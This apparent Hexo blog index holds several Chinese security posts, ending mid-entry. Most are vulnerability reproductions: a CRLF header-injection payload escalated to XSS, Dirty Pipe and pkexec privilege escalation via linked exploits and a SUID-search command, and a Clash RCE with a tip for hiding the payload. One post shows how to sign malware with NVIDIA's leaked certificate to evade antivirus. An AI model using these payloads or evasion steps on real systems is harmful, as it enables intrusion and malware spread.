<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP常见魔术方法</title>
      <link href="2022/04/26/PHP%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
      <url>2022/04/26/PHP%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>等风来，不如追风去</p><hr><span id="more"></span><p>PHP提供了许多“魔术”方法，这些方法由两个下划线前缀 <code>__</code> 标识。它们充当拦截器，在满足某些条件时会自动调用它们，魔术方法提供了一些极其有用的功能</p><h4 id="常见的魔术方法："><a href="#常见的魔术方法：" class="headerlink" title="常见的魔术方法："></a>常见的魔术方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__contruct() 当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct() 当一个对象销毁前被调用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象被序列化前被调用</span><br><span class="line"></span><br><span class="line">__wakeup() 将在反序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">__toString() 当一个对象被当做字符串使用时被调用</span><br><span class="line"></span><br><span class="line">__get()   当获取类的私有属性或不存在的属性时调用此方法</span><br><span class="line">·</span><br><span class="line">__set()   当给类中不存在的属性或私有属性赋值时调用此方法</span><br><span class="line"></span><br><span class="line">__invoke() 调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__call()  调用类不存在的方法或该方法不可访问（私有方法）时自动调用</span><br><span class="line"></span><br><span class="line">__callStatic()  调用类不存在的静态方法或该方法不可访问（私有方法）时自动调用</span><br></pre></td></tr></table></figure><hr><h2 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h2><ul><li>对象创建时被调用</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is __construct function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-4-26/image-20220426161932236.png" alt="Assassins小白"></p><hr><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h2><ul><li>对象销毁前被调用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;this is __destruct function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;test content&#x27;</span>.<span class="string">&quot;\\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="built_in">test</span>();</span><br></pre></td></tr></table></figure><p>程序执行完毕后触发 <code>__destruct()</code> 魔术方法</p><p><img src="../../../../img/22-4-26/image-20220426162054305.png" alt="Assassins小白"></p><p>unset对象后，触发</p><p><img src="../../../../img/22-4-26/image-20220426162105970.png" alt="Assassins小白"></p><hr><h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h2><ul><li>在对象被序列化前被调用</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is __sleep funciton&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;testa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line">serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-4-26/image-20220426162149502.png" alt="Assassins小白"></p><hr><h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h2><ul><li>在反序列化一个对象成功后，会自动调用该方法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is __wakeup funciton&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;testa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-4-26/image-20220426162211118.png" alt="Assassins小白"></p><hr><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><ul><li>当一个对象被当做字符串使用时被调用</li><li>该方法没有任何参数，也不会传递任何参数，但该方法必须有一个返回值，该返回值必须是字符串，且只能是字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;this is __toString funciton&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;testa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-4-26/image-20220426162230491.png" alt="Assassins小白"></p><hr><h2 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h2><ul><li>获取类的私有属性或不存在的属性时调用此方法</li><li>get函数需要设置有一个参数</li></ul><p>1、获取类的私有属性</p><p><img src="../../../../img/22-4-26/image-20220426162243022.png" alt="Assassins小白"></p><p>2、获取不存在的属性</p><p><img src="../../../../img/22-4-26/image-20220426162255217.png" alt="Assassins小白"></p><hr><h2 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h2><ul><li>给类中不存在的属性或不可访问的属性赋值</li><li>set函数需要设置有两个参数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$test</span> = <span class="string">&quot;tett&quot;</span>;<span class="comment">//私有变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is __get funciton&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$v</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is __set funciton&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;test=<span class="number">123</span>;<span class="comment">// 给私有属性赋值</span></span><br></pre></td></tr></table></figure><p>1、给私有属性赋值</p><p><img src="../../../../img/22-4-26/image-20220426162314641.png" alt="Assassins小白"></p><p>2、给不存在的属性赋值</p><p><img src="../../../../img/22-4-26/image-20220426162323040.png" alt="Assassins小白"></p><hr><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h2><ul><li>调用函数的方式调用一个对象时的回应方法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is __invoke funciton&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;tests&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="variable">$a</span>();</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-4-26/image-20220426162339270.png" alt="Assassins小白"></p><hr><h2 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h2><ul><li>调用类中不存在的方法或私有方法时执行</li><li>该方法有两个参数，第一个参数是调用的那个不存在的 方法名 ，第二个参数是一个数组 ( array ) ，是传递给不存在方法的所有参数组成的数组</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$v</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is __call function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;   <span class="comment">// 私有方法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;test();</span><br></pre></td></tr></table></figure><p>1、调用类中的私有方法</p><p><img src="../../../../img/22-4-26/image-20220426162356964.png" alt="Assassins小白"></p><p>2、调用类中不存在的方法</p><p><img src="../../../../img/22-4-26/image-20220426162404876.png" alt="Assassins小白"></p><hr><h2 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h2><ul><li>在调用类的一个不存在的静态方法或该方法不可访问（私有方法）时自动调用，作用和原型都类似于 <code>__call()</code></li><li>该方法同样有两个参数，第一个参数是调用的那个不存在的静态方法名 ，第二个参数是一个数组 ( array ) ，是传递给不存在静态方法的所有参数组成的数组</li><li>该方法要设置为静态方法(前面要加上一个static)，否则会报<code>Warning</code>警告</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$v</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is __callStatic function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">static</span> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;  <span class="comment">// 私有静态方法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="variable">$a</span>::test();</span><br></pre></td></tr></table></figure><p>1、调用私有静态方法</p><p><img src="../../../../img/22-4-26/image-20220426162428430.png" alt="Assassins小白"></p><p>2、调用不存在的静态方法</p><p><img src="../../../../img/22-4-26/image-20220426162435807.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 魔术方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRLF漏洞-&gt;URL跳转变XSS</title>
      <link href="2022/04/20/CRLF%E6%BC%8F%E6%B4%9E-URL%E8%B7%B3%E8%BD%AC%E5%8F%98XSS/"/>
      <url>2022/04/20/CRLF%E6%BC%8F%E6%B4%9E-URL%E8%B7%B3%E8%BD%AC%E5%8F%98XSS/</url>
      
        <content type="html"><![CDATA[<p>人一定要忠于自己年轻时的梦想</p><hr><span id="more"></span><p>URL跳转漏洞</p><p><img src="../../../../img/22-4-20/1.png" alt="Assassins小白"></p><p>测试CRLF，前面加一个 <code>%a</code> 会解析为header头</p><p>payload: <code>%0aSet-Cookie:user%3dsystem</code></p><p><img src="../../../../img/22-4-20/2.png" alt="Assassins小白"></p><p>浏览器Response Headers:</p><p><img src="../../../../img/22-4-20/3.png" alt="Assassins小白"></p><p>前面加上 <code>%0a%0d%0a%0d</code> 或者 <code>%0d%0a%0d%0a</code> 后面的内容会解析为body体</p><p><img src="../../../../img/22-4-20/4.png" alt="Assassins小白"></p><p>插入XSS Payload测试</p><p><img src="../../../../img/22-4-20/5.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> CRLF </tag>
            
            <tag> URL跳转 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>夜神模拟器安装APP桌面停止运行解决方法</title>
      <link href="2022/03/17/%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%AE%89%E8%A3%85APP%E6%A1%8C%E9%9D%A2%E5%81%9C%E6%AD%A2%E8%BF%90%E8%A1%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>2022/03/17/%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%AE%89%E8%A3%85APP%E6%A1%8C%E9%9D%A2%E5%81%9C%E6%AD%A2%E8%BF%90%E8%A1%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>会呼吸的女孩子真的很加分</p><hr><span id="more"></span><p>使用夜神模拟器抓包，把APP拖动到模拟器里面安装经常会闪退</p><p><img src="../../../../img/22-3-17/1.png" alt="Assassins小白"></p><p>我们可以将要安装的APP放到夜神共享目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%homepath%\Nox_share\Download</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-3-17/2.png" alt="Assassins小白"></p><p>然后工具-&gt;Amaze</p><p><img src="../../../../img/22-3-17/3.png" alt="Assassins小白"></p><p>Download里就是我们要安装的APP</p><p><img src="../../../../img/22-3-17/4.png" alt="Assassins小白"></p><p>单击，然后安装</p><p><img src="../../../../img/22-3-17/5.png" alt="Assassins小白"></p><p>安装</p><p><img src="../../../../img/22-3-17/6.png" alt="Assassins小白"></p><p>安装完成</p><p><img src="../../../../img/22-3-17/7.png" alt="Assassins小白"></p><p>桌面生成图标</p><p><img src="../../../../img/22-3-17/8.png" alt="Assassins小白"></p><p>运行正常</p><p><img src="../../../../img/22-3-17/9.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 夜神模拟器 </tag>
            
            <tag> APP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用NVIDIA泄露证书来制作免杀</title>
      <link href="2022/03/08/%E4%BD%BF%E7%94%A8NVIDIA%E6%B3%84%E9%9C%B2%E8%AF%81%E4%B9%A6%E6%9D%A5%E5%88%B6%E4%BD%9C%E5%85%8D%E6%9D%80/"/>
      <url>2022/03/08/%E4%BD%BF%E7%94%A8NVIDIA%E6%B3%84%E9%9C%B2%E8%AF%81%E4%B9%A6%E6%9D%A5%E5%88%B6%E4%BD%9C%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<p>爱意随风起，风止意难平</p><hr><span id="more"></span><p>泄露的证书14年就过期了</p><p><img src="../../../../img/22-3-8/4.png" alt="Assassins小白"></p><p>泄露有以下几个文件</p><p><img src="../../../../img/22-3-8/5.png" alt="Assassins小白"></p><p>先把做签名处理之前的文件拿去 <code>www.virustotal.com</code> 检测一下，58个av查杀</p><p><img src="../../../../img/22-3-8/9.png" alt="Assassins小白"></p><p>我们把要签名的文件放到当前目录下面，然后运行  <code>sign.bat 文件名</code></p><p><img src="../../../../img/22-3-8/6.png" alt="Assassins小白"></p><p>出现以下提示，我们输入 <code>2014/03/02</code> 就可以了，只要在证书的有效期内就行</p><p><img src="../../../../img/22-3-8/7.png" alt="Assassins小白"></p><p>这样就已经写好签名了，看看文件签名</p><p><img src="../../../../img/22-3-8/8.png" alt="Assassins小白"></p><p>那签名后的文件查杀再去 <code>www.virustotal.com</code> 检测，只有42个av查杀了，虽然失效了，还是能绕过一小部分杀软的</p><p><img src="../../../../img/22-3-8/10.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> NVIDIA泄露 </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux本地提权CVE-2022-0847漏洞复现</title>
      <link href="2022/03/08/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2022/03/08/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>那些曾经击倒我的人，谢谢你们，躺着真舒服</p><hr><span id="more"></span><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>新管道缓冲区结构的“flags”成员在 Linux 内核中的 copy_page_to_iter_pipe 和 push_pipe 函数中缺乏正确初始化的方式存在缺陷，因此可能包含陈旧的值。非特权本地用户可以使用此漏洞写入由只读文件支持的页面缓存中的页面，从而提升他们在系统上的权限</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>内核影响版本：5.8 &lt;= Linux kernel &lt; 5.16.11 / 5.15.25 / 5.10.102</p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p><a href="https://github.com/badboycxcc/script/blob/main/dirtypipez.c">https://github.com/badboycxcc/script/blob/main/dirtypipez.c</a></p><p>复现截图：</p><p><img src="../../../../img/22-3-8/1.png" alt="Assassins小白"></p><p>./exp 后面跟的文件要求：有suid权限的可执行文件，所属root即可，利用这个文件进行提权</p><p><img src="../../../../img/22-3-8/2.png" alt="Assassins小白"></p><p>可以使用以下命令可以找到这类文件<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="../../../../img/22-3-8/3.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux本地提权 </tag>
            
            <tag> CVE-2022-0847 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash RCE 复现</title>
      <link href="2022/02/26/Clash-RCE%E5%A4%8D%E7%8E%B0/"/>
      <url>2022/02/26/Clash-RCE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>今天都在发Clash的Rce，但是大哥说这Clash的漏洞21年就有了，而且也不是新技术，因为clash使用了Electron框架开发，框架的xss漏洞导致的rce，简单复现一下吧</p><hr><span id="more"></span><p>使用以下脚本复现：<a href="https://github.com/Jaky5155/clash_windows_RCE">Jaky5155/clash_windows_RCE</a><br>直接下载回来，拖入Clash订阅<br>然后点击 <code>节点</code>，就会触发，成功Rce了</p><p><img src="../../../../img/22-2-26/image-20220226014428884.png" alt="Assassins小白"></p><p>但是看着有加载失败的图片图标，让人看着很可疑，简单做一下伪装吧</p><p>在payload后面添加：<code>height=&quot;0&quot; width=&quot;0&quot;</code> </p><p><img src="../../../../img/22-2-26/image-20220226015951125.png" alt="Assassins小白"></p><p>这样就不会显示出失败的图片了</p><p>效果：</p><p><img src="../../../../img/22-2-26/image-20220226020109344.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> Clash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-4034 pkexec 本地提权</title>
      <link href="2022/01/26/CVE-2021-4034-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
      <url>2022/01/26/CVE-2021-4034-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>越来越不爱说话了，最近打算去报个手语班</p><hr><span id="more"></span><h2 id="文章介绍："><a href="#文章介绍：" class="headerlink" title="文章介绍："></a>文章介绍：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0NDE3MTkzNQ==&amp;mid=2247484217&amp;idx=1&amp;sn=b01d4a2a491d17a72f092fa6bf0dc2d1&amp;chksm=c329fdc9f45e74df1bb9fc5c4699dfdf4eac954dd53ed89fb8d62ba0bbe94f5fb2da75c59569&amp;mpshare=1&amp;scene=1&amp;srcid=01261Xb1B1Cl6qlznE5HPUIB&amp;sharer_sharetime=1643178087788&amp;sharer_shareid=7ade7cd67b3fd182fc7e3126dee1d2e7&amp;version=3.1.23.70088&amp;platform=mac#rd">https://mp.weixin.qq.com/s?__biz=Mzk0NDE3MTkzNQ==&amp;mid=2247484217&amp;idx=1&amp;sn=b01d4a2a491d17a72f092fa6bf0dc2d1&amp;chksm=c329fdc9f45e74df1bb9fc5c4699dfdf4eac954dd53ed89fb8d62ba0bbe94f5fb2da75c59569&amp;mpshare=1&amp;scene=1&amp;srcid=01261Xb1B1Cl6qlznE5HPUIB&amp;sharer_sharetime=1643178087788&amp;sharer_shareid=7ade7cd67b3fd182fc7e3126dee1d2e7&amp;version=3.1.23.70088&amp;platform=mac#rd</a></p><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>2009年5月至今发布的所有 Polkit 版本</p><p>注：Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响</p><h2 id="不受影响版本"><a href="#不受影响版本" class="headerlink" title="不受影响版本"></a>不受影响版本</h2><p><strong>CentOS</strong>：</p><ul><li>CentOS 6：polkit-0.96-11.el6_10.2</li><li>CentOS 7：polkit-0.112-26.el7_9.1</li><li>CentOS 8.0：polkit-0.115-13.el8_5.1</li><li>CentOS 8.2：polkit-0.115-11.el8_2.2</li><li>CentOS 8.4：polkit-0.115-11.el8_4.2</li></ul><p><strong>Ubuntu</strong>：</p><ul><li>Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1</li><li>Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1</li><li>Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6</li><li>Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2</li><li>Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1</li></ul><p><strong>Debain</strong>：</p><ul><li>：policykit-1 0.105-18+deb9u2</li><li>Debain stretch：policykit-1 0.105-18+deb9u2</li><li>Debain buster：policykit-1 0.105-25+deb10u1</li><li>Debain bullseye：policykit-1 0.105-31+deb11u1</li><li>Debain bookworm,bullseye：policykit-1 0.105-31.1</li></ul><h2 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h2><p>需要编译再利用：<a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a><br><img src="../../../../img/22-1-26/e59eb474c8c1ce2681e1520417841642.png" alt="Assassins小白"></p><h2 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h2><p>直接用python3利用，不需要编译：<a href="https://github.com/nikaiw/CVE-2021-4034">https://github.com/nikaiw/CVE-2021-4034</a></p><p><img src="../../../../img/22-1-26/12825c21f2f3168c06dfc50444b2fc01.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE-2021-4034 </tag>
            
            <tag> pkexec </tag>
            
            <tag> Linux本地提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink任意文件上传/读取(CVE-2020-17518/17519)漏洞复现</title>
      <link href="2022/01/21/Apache-Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%AF%BB%E5%8F%96-CVE-2020-17518-17519-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2022/01/21/Apache-Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%AF%BB%E5%8F%96-CVE-2020-17518-17519-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
